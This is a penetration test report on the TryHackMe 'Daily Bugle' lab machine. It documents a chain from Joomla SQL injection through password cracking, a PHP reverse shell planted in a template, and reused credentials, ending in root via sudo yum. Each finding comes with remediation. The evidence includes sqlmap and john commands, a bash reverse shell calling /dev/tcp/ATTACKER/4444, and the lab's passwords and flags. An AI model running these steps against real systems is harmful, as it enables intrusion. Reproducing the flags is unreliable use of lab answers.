# Penetration Test Report — Daily Bugle

| | |
|---|---|
| **Target** | `dailybugle` / `10.128.140.121` |
| **Platform** | TryHackMe — https://tryhackme.com/room/dailybugle |
| **Assessment type** | Black-box network/web penetration test |
| **Date** | 2026-11-20 |
| **Result** | **Full compromise — root achieved** |
| **Overall risk** | 🔴 **Critical** |

---

## 1. Executive summary

The Daily Bugle host was assessed from an unauthenticated, black-box starting position. Within a single engagement, testing achieved **complete administrative (root) compromise** of the server.

The entry point was an **outdated Joomla 3.7.0 content management system** carrying a publicly known, unauthenticated **SQL injection** vulnerability (CVE-2017-8917). This allowed extraction of the administrator's credentials from the database. The password, though securely hashed, was weak and was recovered offline in under a second. Administrative access to Joomla was then abused to write server-side code (a reverse shell), yielding a foothold on the host. From there, a **database password stored in plaintext** — and **reused** as a system user's login password — enabled escalation to a real user account, and a **misconfigured `sudo` permission** on the `yum` package manager allowed trivial escalation to **root**.

Every link in this chain is a well-known, preventable weakness. The single most important action is to **update Joomla and retire the end-of-life PHP 5.6 stack**; the privilege-escalation findings should be remediated in parallel.

**Key outcomes**
- Unauthenticated SQL injection → full database read, including admin credentials.
- Administrative CMS access → remote code execution → shell as `apache`.
- Plaintext + reused credentials → escalation to user `jjameson`.
- `sudo yum` misconfiguration → escalation to **root**.
- Flags captured: user `27a260fe3cba712cfdedb1c86d80442e`, root `eec3d53292b1821868266858d7fa6f79`.

---

## 2. Finding register

| ID | Finding | Severity | CVSS |
|----|---------|----------|------|
| F-01 | Unauthenticated SQL injection in Joomla 3.7.0 (CVE-2017-8917) | **Critical** | 9.8 |
| F-02 | Weak administrator password (crackable offline) | **High** | 8.1 |
| F-03 | Authenticated remote code execution via template editor | **High** | 8.0 |
| F-04 | Database credentials stored in plaintext and reused for a system account | **High** | 7.8 |
| F-05 | `sudo` NOPASSWD on `yum` enables privilege escalation to root | **High** | 7.8 |
| F-06 | End-of-life / outdated software stack (Joomla 3.7.0, PHP 5.6.40) | **Medium** | 5.3 |

---

## 3. Findings (detail)

### F-01 — Unauthenticated SQL injection in Joomla 3.7.0 (CVE-2017-8917)

- **Severity:** Critical (CVSS 9.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Affected component:** Joomla 3.7.0 `com_fields` component, parameter `list[fullordering]`.
- **Description:** Joomla 3.7.0 introduced the `com_fields` component, exposed to the front end without authentication. The `list[fullordering]` parameter is placed into a SQL `ORDER BY` clause without sanitisation, permitting arbitrary database queries by any anonymous user.
- **Evidence:**
  ```
  sqlmap -u "http://TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" \
         -p "list[fullordering]" --dbs
  → Parameter 'list[fullordering]' is vulnerable (error-based + time-based blind)
  → Databases: information_schema, joomla, mysql, performance_schema, test
  Dumped joomla.#__users:
  jonah | $2y$10$0veO/JSFh4389Lluc4Xya... | jonah@tryhackme.com
  ```
- **Impact:** Complete read access to the application database, including usernames and password hashes — the first link enabling full compromise.
- **Remediation:**
  - Update Joomla to **3.7.1 or later** (the flaw was patched in 3.7.1); ideally to a current supported branch.
  - Deploy a WAF as defence-in-depth, not as a substitute for patching.
- **References:** CVE-2017-8917; Joomla Security Announcement 20170501.

### F-02 — Weak administrator password

- **Severity:** High (CVSS 8.1)
- **Description:** The Super User account (`jonah`) used the password **`spiderman123`** — a themed, dictionary-adjacent password. Although stored as bcrypt (cost 10), the weak plaintext was recovered offline in under one second using a context-derived wordlist (terms related to the site's Spider-Man theme).
- **Evidence:**
  ```
  john --wordlist=spider.txt hash.txt
  → spiderman123 (?)   [cracked in <1s]
  ```
- **Impact:** Strong hashing is nullified by weak password choice; the admin account was trivially taken over.
- **Remediation:**
  - Enforce a strong password policy (length ≥ 14, complexity, breached-password screening).
  - Enable multi-factor authentication on administrative accounts.
  - Avoid passwords derivable from the organisation/brand context.

### F-03 — Authenticated remote code execution via template editor

- **Severity:** High (CVSS 8.0)
- **Description:** A Joomla Super User can edit template `.php` files from the web interface. Writing PHP here results in server-side code execution. A reverse shell was planted in `templates/protostar/index.php` and triggered over HTTP, yielding a shell as the `apache` user.
- **Evidence:**
  ```
  # payload written to protostar/index.php
  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"); ?>
  # triggered:
  curl http://TARGET/templates/protostar/index.php
  → shell as uid=48(apache)
  ```
- **Impact:** Any administrative compromise escalates directly to code execution on the server.
- **Remediation:**
  - Restrict administrator privileges; separate content editors from users who can edit templates/extensions.
  - Make the web root / template files read-only to the web server where feasible.
  - Monitor for unexpected changes to template files (file integrity monitoring).

### F-04 — Plaintext, reused database credentials

- **Severity:** High (CVSS 7.8)
- **Description:** `/var/www/html/configuration.php` stores the database password in plaintext (`nv5uz9r3ZEDzVjNu`). This same password was reused as the login password for the system user `jjameson`, enabling escalation from the `apache` service account to a real user.
- **Evidence:**
  ```
  cat /var/www/html/configuration.php
  → public $password = 'nv5uz9r3ZEDzVjNu';
  su jjameson  → (password accepted) → uid=1000(jjameson)
  ```
- **Impact:** Lateral/vertical movement from the web service account to an interactive user account.
- **Remediation:**
  - Do not reuse the database password for any OS/user account.
  - Restrict read permissions on `configuration.php` to the minimum required.
  - Use distinct, managed secrets per service.

### F-05 — `sudo` NOPASSWD on `yum` (privilege escalation to root)

- **Severity:** High (CVSS 7.8)
- **Description:** User `jjameson` may run `/usr/bin/yum` as root without a password (`(ALL) NOPASSWD: /usr/bin/yum`). `yum` loads plugins (arbitrary Python); a malicious plugin executed as root yields a root shell (GTFOBins technique).
- **Evidence:**
  ```
  sudo -l → (ALL) NOPASSWD: /usr/bin/yum
  # malicious yum plugin loaded → root shell
  id → uid=0(root)
  cat /root/root.txt → eec3d53292b1821868266858d7fa6f79
  ```
- **Impact:** Complete system compromise (root).
- **Remediation:**
  - Remove the `NOPASSWD` `yum` entry; grant package-management rights only to trusted administrators.
  - Follow least-privilege for all `sudo` rules; audit with `sudo -l` across accounts.
- **References:** GTFOBins — `yum`.

### F-06 — Outdated / end-of-life software stack

- **Severity:** Medium (CVSS 5.3)
- **Description:** The host runs Joomla 3.7.0 (2017), PHP 5.6.40 (end-of-life since Dec 2018), Apache 2.4.6, on CentOS 7. Unsupported software accumulates unpatched vulnerabilities.
- **Impact:** Broad exposure beyond the specific CVE exploited here.
- **Remediation:** Establish a patch-management lifecycle; upgrade to supported PHP (8.x) and a maintained CMS version; plan CentOS 7 migration (itself EOL).

---

## 4. Attack narrative

Reconnaissance revealed a lean surface: SSH (22), HTTP (80), MariaDB (3306). The web server hosted **Joomla 3.7.0**, pinned via its manifest files. That version carries **CVE-2017-8917**, an unauthenticated SQL injection, which was used to dump the administrator's username and bcrypt hash. The password (`spiderman123`) was weak and cracked **offline in under a second** using a wordlist built from the site's own theme. Administrative access was abused through Joomla's **template editor** to write a PHP reverse shell, giving a foothold as `apache`. The Joomla **configuration file exposed the database password in plaintext**, which had been **reused** as system user `jjameson`'s password — enabling escalation to that account and capture of the user flag. Finally, a **`sudo` misconfiguration on `yum`** was abused via a malicious plugin to obtain a **root** shell. Each weakness is individually well-known; chained, they produced full compromise from an anonymous starting point.

---

## 5. Remediation roadmap

| Priority | Action | Addresses |
|----------|--------|-----------|
| **Immediate** | Patch/upgrade Joomla (≥3.7.1, ideally current) | F-01 |
| **Immediate** | Remove `NOPASSWD: /usr/bin/yum` sudo rule | F-05 |
| **Short-term** | Enforce strong passwords + MFA on admin accounts | F-02 |
| **Short-term** | Stop password reuse; lock down `configuration.php`; rotate the DB credential | F-04 |
| **Short-term** | Restrict template-edit rights; file-integrity monitoring on web root | F-03 |
| **Strategic** | Patch-management lifecycle; migrate off EOL PHP 5.6 / CentOS 7 | F-06 |

---

## 6. Appendix — proof

- User flag (`/home/jjameson/user.txt`): `27a260fe3cba712cfdedb1c86d80442e`
- Root flag (`/root/root.txt`): `eec3d53292b1821868266858d7fa6f79`
- Full technical narrative: [`walkthrough.md`](./walkthrough.md)
- **Scope & authorization:** Testing was limited to the single authorized TryHackMe target over the platform's isolated VPN.
- **Post-engagement cleanup:** reverse shell removed from `protostar/index.php`; temporary yum-plugin directory removed.
